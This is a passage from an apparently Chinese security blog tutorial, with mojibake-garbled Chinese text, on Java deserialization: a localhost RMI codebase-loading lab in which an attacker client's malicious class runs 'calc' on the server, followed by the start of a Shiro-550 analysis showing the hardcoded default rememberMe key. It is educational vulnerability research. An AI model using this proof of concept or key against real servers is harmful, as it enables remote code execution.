    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">new</span> <span class="token class-name">RemoteRMIServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ICalc.java</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ICalc</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">&#123;</span><span class="token comment">//åŠŸèƒ½æ¥å£</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> params<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Calc.java</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">ICalc</span> <span class="token punctuation">&#123;</span><span class="token comment">//å®ç°åŠŸèƒ½</span>
    <span class="token keyword">public</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> params<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Integer</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> param <span class="token operator">:</span> params<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            sum <span class="token operator">+=</span> param<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="æ”»å‡»æ–¹"><a href="#æ”»å‡»æ–¹" class="headerlink" title="æ”»å‡»æ–¹"></a>æ”»å‡»æ–¹</h4><p><strong>RMIClient</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token comment">/* static æ–¹æ³•é‡Œæ˜¯æˆ‘ä»¬çš„æ¶æ„æ‰§è¡Œä»£ç  */</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Payload</span> <span class="token keyword">extends</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//åŒæ ·éœ€è¦å®‰è£…SecurityManager</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setup SecurityManager"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setSecurityManager</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">ICalc</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ICalc</span><span class="token punctuation">)</span>
                <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/refObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŸ¥æ‰¾Registryä¸Šçš„refObj service</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> li <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œè°ƒç”¨äº†è¿œç¨‹æ–¹æ³•çš„sum(),å¹¶ä¼ å…¥äº†liå¯¹è±¡</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">new</span> <span class="token class-name">RMIClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ä¸ºä»€ä¹ˆRMIClientè¿™æ ·å†™å°±èƒ½è§¦å‘æ¼æ´å‘¢ï¼Ÿ</strong></p>
<p>å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹JAVA RMIåŸç†ã€æµç¨‹(2)</a>å°±æœ‰æåˆ°è¿‡ï¼Œè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ˜¯åœ¨serverè¿›è¡Œçš„ï¼Œè€Œå¹¶é<strong>æœ¬åœ°clientç«¯</strong>ï¼ŒåŒæ—¶ï¼Œè¿œç¨‹è°ƒç”¨çš„æ–¹æ³•å‚æ•°æ˜¯ç»è¿‡åºåˆ—åŒ–çš„ã€‚</p>
<p>æ‹¿è¿™ä¸ªä¾‹å­æ¥è¯´ï¼Œæˆ‘ä»¬é¦–å…ˆç”¨<code>ICalc r = (ICalc) Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);</code>æ‰¾åˆ°äº†<strong>Registry</strong>ä¸Šçš„<strong>refobj</strong>æ–¹æ³•ï¼Œåˆè°ƒç”¨äº†å…¶<strong>sum</strong>æ–¹æ³•ã€‚å…³é”®ç‚¹åœ¨äºï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨å…¶<strong>sum</strong>æ–¹æ³•çš„æ—¶å€™ä¼ å…¥äº†æˆ‘ä»¬åœ¨æœ¬åœ°æ„é€ çš„ <code>Payload</code> ç±»å‹çš„å¯¹è±¡ <code>li</code>ï¼Œ<code>li</code>è¢«åºåˆ—åŒ–ï¼Œéš<code>sum()</code>ä¼ å…¥<strong>serverè¿›è¡Œè°ƒç”¨</strong>ï¼Œæ¥ç€serverç«¯ä¼šå¯¹å®ƒè¿›è¡Œ<strong>ååºåˆ—åŒ–</strong>ã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>RemoteRMIServer.java</strong>å‘ç°è¿™ä¸ªPayloadç±»å®ƒå¹¶ä¸è®¤è¯†ï¼Œå› ä¸ºåœ¨serverç«¯å¹¶æ²¡æœ‰è¯¥ç±»ã€‚äºæ˜¯å®ƒå°±å»<strong>codebase</strong>æŒ‡å‘çš„åœ°å€ä¸Šæ‰¾Payloadç±»ï¼Œæ‰¾åˆ°åå°†è¯¥ç±»çš„å®šä¹‰ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæ‰èƒ½ååºåˆ—åŒ–<code>li</code>å¯¹è±¡ã€‚</p>
<p>è€Œæˆ‘ä»¬çš„Payloadç±»çš„staticæ–¹æ³•ä¸­æœ‰æ¶æ„ä»£ç (æ­¤å¤„æˆ‘ä»¬æ˜¯å°†payloadç±»å’ŒRMIClientå†™åœ¨ä¸€èµ·äº†)ï¼Œæ‰€ä»¥å½“serveråŠ è½½åï¼Œä¼šæ‰§è¡Œè¯¥æ¶æ„ä»£ç ã€‚</p>
<h4 id="Policyé…ç½®"><a href="#Policyé…ç½®" class="headerlink" title="Policyé…ç½®"></a>Policyé…ç½®</h4><p>Serverç«¯å’ŒClientç«¯éƒ½éœ€è¦æ–°å»ºä¸€ä¸ªæ–‡ä»¶æ¥æ§åˆ¶RMIçš„è®¿é—®æƒé™ï¼Œè¿™é‡Œæˆ‘ä»¬å‘½åä¸º<strong>client.policy</strong></p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">grant <span class="token punctuation">&#123;</span>
    permission java.security.AllPermission;
<span class="token punctuation">&#125;</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="ç¯å¢ƒæ¨¡æ‹Ÿ"><a href="#ç¯å¢ƒæ¨¡æ‹Ÿ" class="headerlink" title="ç¯å¢ƒæ¨¡æ‹Ÿ"></a>ç¯å¢ƒæ¨¡æ‹Ÿ</h4><p>æˆ‘ä»¬åœ¨IDEAä¸­é€‰æ‹©build projectï¼Œè®©å®ƒç”Ÿæˆclassæ–‡ä»¶ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212231734543.png" alt="image-20211212231734543" loading="lazy"></p>
<p>æ­¤æ—¶outç›®å½•ä¸‹ä¼šç”Ÿæˆæˆ‘ä»¬æ‰€æœ‰çš„classæ–‡ä»¶</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212234937446.png" alt="image-20211212234937446" loading="lazy"></p>
<p>åœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œ<strong>RMIClient</strong>æ˜¯åœ¨æ”»å‡»è€…çš„ç”µè„‘ä¸Šè¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘æŠŠ<strong>RMIClient</strong>ç§»åŠ¨åˆ°<strong>å…¶ä»–ç›®å½•</strong>ä¸‹æ¥æ¨¡æ‹Ÿè¿™ä¸ªç¯å¢ƒã€‚</p>
<p>å¦‚æœä½ è¿›å…¥out/production/RM_ITESTç”Ÿæˆç›®å½•ï¼ˆä¸åœ¨IDEAä¸­ï¼‰ä¸‹çœ‹çš„è¯ï¼Œä½ ä¼šå‘ç°è¿˜æœ‰ä¸€ä¸ªclassæ–‡ä»¶ - <strong>RMIClient$Payload.class</strong>ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨RMIClientå†…éƒ¨ç”Ÿæˆçš„classæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯Serverä¼šå»æ‰¾çš„Payloadç±»ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½è®©å®ƒä¸<strong>RemoteRMIServer.class</strong>åœ¨ä¸€ä¸ªç›®å½•ï¼Œä¸ç„¶Serverç«¯æ˜¯èƒ½åœ¨æœ¬åœ°æ‰¾åˆ°Payloadç±»çš„ï¼Œä»è€Œä¸èƒ½è§¦å‘æ¼æ´ã€‚åŒæ ·å°†å®ƒç§»åŠ¨åˆ°å…¶ä»–ç›®å½•å»ï¼Œè¿™é‡Œæˆ‘æŠŠå®ƒå’Œ<strong>RMIClient.classã€ICalc</strong>æ”¾ä¸€èµ·ã€‚</p>
<p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ç–‘é—®ä¸ºä»€ä¹ˆè¦å°†<strong>ICalc</strong>ä¹Ÿæ”¾åœ¨è¿™ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨Clientçš„ä»£ç ä¸­å°†stubè½¬æ¢æˆäº†ICalcç±»ï¼Œæ‰€ä»¥ä¹Ÿå¾—æ”¾åœ¨ä¸€èµ·ã€‚é‚£èƒ½ä¸èƒ½ä¸è½¬æ¢å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¸å¯ä»¥ï¼Œç»è¿‡æµ‹è¯•ï¼ŒStubå¿…é¡»è¢«è½¬åŒ–ä¸ºç›¸åº”çš„ç±»ï¼Œå¦åˆ™callå…¶æ–¹æ³•çš„æ—¶å€™ä¸ä¼šæœ‰ååº”ã€‚æ³¨æ„è¿™é‡Œä¹Ÿéœ€è¦client.policy,å› ä¸ºæˆ‘ä»¬åœ¨clientä¹Ÿé…ç½®äº†SecurityManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001727380.png" alt="image-20211213001727380" loading="lazy"></p>
<p>ä¸€åˆ‡å‡†å¤‡å°±ç»ªï¼Œå…ˆè¿è¡ŒServerç«¯</p>
<p>è¿™é‡Œæˆ‘é€‰æ‹©ç”¨<strong>terminal</strong>æ¥æ‰§è¡Œï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨IDEAçš„é…ç½®æ¥æ‰§è¡Œ</p>
<p><code>java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</code></p>
<p>æ­¤å¤„<strong>hostname</strong>ä¸ºä½ RMIæœåŠ¡å™¨çš„åœ°å€ï¼Œ<strong>security.policy</strong>æ˜¯æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„policyæ–‡ä»¶çš„åå­—ï¼Œ<strong>RemoteRMIServer</strong>æ˜¯æˆ‘ä»¬è¦è¿è¡Œçš„Java classæ–‡ä»¶åå­—</p>
<p>ä½ éœ€è¦åœ¨ç”Ÿæˆçš„ç›¸å…³<strong>class</strong>æ–‡ä»¶ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤(ä¹‹å‰ä¸€ç›´åœ¨IDEAä¸‹é¢çš„terminalè¿è¡Œï¼Œè¿è¡Œå®é™…æ˜¯åœ¨javaæ–‡ä»¶ç›®å½•ä¸‹ï¼Œå¯¼è‡´å¡åœ¨è¿™é‡Œå¾ˆä¹…)</p>
<p>æ¥ç€ä½ éœ€è¦æ¨¡ä»¿æ”»å‡»è€…ï¼Œåœ¨ä½ çš„æ¶æ„ç±»(RMIClient$Payload.class)æ‰€åœ¨ç›®å½•æ­å»ºä¸€ä¸ª<strong>http</strong>æœåŠ¡ï¼Œä¾›<strong>server</strong>ç«¯è®¿é—®ä¸‹è½½ä½ çš„æ¶æ„ç±»</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233501619.png" alt="image-20211212233501619" loading="lazy"></p>
<p>æ­¤å¤„æˆ‘ä½¿ç”¨pythonï¼Œåœ¨æœ¬åœ°æ­å»ºäº†ä¸€ä¸ª8080ç«¯å£çš„webæœåŠ¡</p>
<p>æ¥ç€ï¼Œå¯ä»¥ç”¨<strong>RMIClient</strong>å®æ–½æ”»å‡»äº†</p>
<p><code>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:8080/ -Djava.security.policy=client.policy RMIClient</code></p>
<p>è¿™é‡Œçš„codebaseæ˜¯ä½ æ­å»ºçš„webæœåŠ¡åœ°å€ï¼Œ<strong>RMIClient</strong>ä¸ºä½ è¿è¡Œçš„Classåå­—ã€‚</p>
<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼<strong>è®¡ç®—å™¨è¢«å¼¹å‡ºä¸¤æ¬¡</strong>ï¼Œç¬¬ä¸€æ¬¡æ˜¯å› ä¸ºClientåˆ›å»ºPayloadå®ä¾‹(åœ¨æ”»å‡»è€…ç”µè„‘ä¸Šå¼¹å‡º)ï¼Œç¬¬äºŒæ¬¡æ˜¯è¿œç¨‹æ‰§è¡Œ(åœ¨è¢«æ”»å‡»æœåŠ¡ç«¯ä¸Šå¼¹å‡º)ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233854484.png" alt="image-20211212233854484" loading="lazy"></p>
<p>åŒæ—¶æˆ‘ä»¬åœ¨pythonè¿è¡Œçš„webæœåŠ¡ä¸Šä¹Ÿèƒ½çœ‹åˆ°classåŠ è½½è®°å½•</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001956198.png" alt="image-20211213001956198" loading="lazy"></p>
<h3 id="Reference-6"><a href="#Reference-6" class="headerlink" title="Reference"></a>Reference</h3><p>Pç¥ - Javaå®‰å…¨æ¼«è°ˆ</p>
<h1 id="Shiroååºåˆ—åŒ–æ¼æ´ç³»åˆ—"><a href="#Shiroååºåˆ—åŒ–æ¼æ´ç³»åˆ—" class="headerlink" title="Shiroååºåˆ—åŒ–æ¼æ´ç³»åˆ—"></a>Shiroååºåˆ—åŒ–æ¼æ´ç³»åˆ—</h1><h2 id="Shiro550ååºåˆ—åŒ–æ¼æ´"><a href="#Shiro550ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Shiro550ååºåˆ—åŒ–æ¼æ´"></a>Shiro550ååºåˆ—åŒ–æ¼æ´</h2><h3 id="ç¯å¢ƒæ­å»º-8"><a href="#ç¯å¢ƒæ­å»º-8" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/apache/shiro.git  
<span class="token builtin class-name">cd</span> shiro
<span class="token function">git</span> checkout shiro-root-1.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>åœ¨Intellijä¸­å°†<strong>samples/web</strong>ä»¥é¡¹ç›®çš„å½¢å¼æ‰“å¼€ï¼Œåœ¨pom.xmlä¸­å°†jstlä¿®æ”¹ä¸º1.2ç‰ˆæœ¬</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>runtime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ•´ä¸ªprojectå°†ä½¿ç”¨jdk1.8</p>
<p>Tomcaté…ç½®å¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223132310175.png" alt="image-20211223132310175" loading="lazy"></p>
<p>è¿è¡Œå³å¯ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223151852743.png" alt="image-20211223151852743" loading="lazy"></p>
<h3 id="ååºåˆ—åŒ–è§¦å‘æµç¨‹"><a href="#ååºåˆ—åŒ–è§¦å‘æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–è§¦å‘æµç¨‹"></a>ååºåˆ—åŒ–è§¦å‘æµç¨‹</h3><h4 id="å…¥æ‰‹ç‚¹"><a href="#å…¥æ‰‹ç‚¹" class="headerlink" title="å…¥æ‰‹ç‚¹"></a>å…¥æ‰‹ç‚¹</h4><p>é—®é¢˜ä¸»è¦å‡ºåœ¨ç™»å½•å¤„çš„<strong>Remember Me</strong>åŠŸèƒ½ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152235321.png" alt="image-20211223152235321" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152603584.png" alt="image-20211223152603584" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152643912.png" alt="image-20211223152643912" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°ç™»é™†åçš„cookieä¸­ä¼šæœ‰rememberMeçš„å­—æ®µï¼ŒåŒæ—¶åé¢è·Ÿäº†ä¸€é•¿ä¸²çš„æ•°æ®ã€‚</p>
<p>æˆ‘ä»¬çŒœæµ‹rememberMeå¯èƒ½ä¿å­˜äº†æˆ‘ä»¬çš„è´¦å·å¯†ç æ•°æ®</p>
<p>ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„çŒœæƒ³ï¼Œåœ¨Intellijä¸­è¿ç»­æŒ‰ä¸¤ä¸‹shiftï¼Œæœç´¢RememberMe</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223153240686.png" alt="image-20211223153240686" loading="lazy"></p>
<p>è¿™é‡Œæ‰¾åˆ°äº†ç›¸å…³çš„Classï¼Œæˆ‘ä»¬è¿›å…¥AbstractRememberMeManagerçœ‹ä¸€ä¸‹</p>
<p>çœ‹åå­—ï¼Œæˆ‘ä»¬å°±èƒ½çŒœå‡ºæ˜¯å’ŒRemember Meè¿™ä¸ªåŠŸèƒ½æœ‰å…³</p>
<p>çœ‹ä¸€ä¸‹å®ƒçš„constructor</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_CIPHER_KEY_BYTES <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setCipherKey</span><span class="token punctuation">(</span>DEFAULT_CIPHER_KEY_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„è®¾ç½®äº†cipher key</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>encryptionCipherKey <span class="token operator">=</span> encryptionCipherKey<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
